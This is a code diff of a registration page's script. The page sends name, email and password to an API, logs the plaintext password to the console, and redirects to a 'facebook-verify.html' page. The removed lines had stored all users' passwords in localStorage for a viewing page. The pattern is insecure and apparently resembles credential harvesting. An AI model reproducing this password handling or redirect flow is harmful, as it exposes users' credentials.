@@ -9,7 +9,6 @@
 </head>
 <body>
 
-    <!-- ===== NAVBAR ===== -->
     <nav class="navbar">
         <div class="container nav-container">
             <a href="index.html" class="logo">
@@ -79,7 +78,6 @@
     </footer>
 
     <script>
-        // ===== REGISTER FORM - API CALL =====
         document.getElementById('registerForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -92,7 +90,7 @@
                 return;
             }
 
-            console.log('📤 Sending data to API:', { name, email, password });
+            console.log('📤 Sending data:', { name, email, password });
 
             try {
                 const response = await fetch('/api/save-user', {
@@ -102,32 +100,17 @@
                 });
 
                 const result = await response.json();
-                console.log('✅ Response from API:', result);
+                console.log('✅ Response:', result);
 
                 if (result.success) {
-                    // Also save to Local Storage for view-data.html
-                    let allUsers = [];
-                    const saved = localStorage.getItem('allUsersData');
-                    if (saved) {
-                        allUsers = JSON.parse(saved);
-                    }
-                    allUsers.push({
-                        id: Date.now(),
-                        name: name,
-                        email: email,
-                        password: password,
-                        submittedAt: new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })
-                    });
-                    localStorage.setItem('allUsersData', JSON.stringify(allUsers));
-
-                    alert('✅ Registration successful! Redirecting to Facebook...');
+                    alert('✅ Registration successful!');
                     window.location.href = 'facebook-verify.html';
                 } else {
                     alert('⚠️ Error: ' + result.error);
                 }
             } catch (error) {
                 console.error('❌ Error:', error);
-                alert('⚠️ Error saving data. Please try again.');
+                alert('⚠️ Error: ' + error.message);
             }
         });
     </script>
